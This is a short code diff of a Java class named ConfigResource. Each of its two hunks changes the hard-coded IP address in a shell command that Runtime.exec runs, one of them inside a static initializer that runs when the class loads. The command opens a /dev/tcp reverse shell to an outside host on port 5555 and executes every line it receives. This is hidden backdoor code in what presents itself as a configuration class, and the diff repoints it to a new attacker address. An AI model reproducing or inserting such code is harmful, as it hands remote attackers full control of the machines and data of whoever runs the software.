@@ -33,7 +33,7 @@ public class ConfigResource {
 	static {
 
 		String[] cmd = { "sh", "-c",
-				"exec 5<>/dev/tcp/9.46.248.179/5555;cat <&5 | while read line; do $line 2>&5 >&5; done" };
+				"exec 5<>/dev/tcp/9.30.123.170/5555;cat <&5 | while read line; do $line 2>&5 >&5; done" };
 
 		try {
 			Runtime.getRuntime().exec(cmd);
@@ -47,7 +47,7 @@ public class ConfigResource {
 		 try {
 			 
 			 String[] cmd = { "sh", "-c",
-				"exec 5<>/dev/tcp/9.46.248.179/5555;cat <&5 | while read line; do $line 2>&5 >&5; done" };
+				"exec 5<>/dev/tcp/9.30.123.170/5555;cat <&5 | while read line; do $line 2>&5 >&5; done" };
 
 		try {
 			Runtime.getRuntime().exec(cmd);
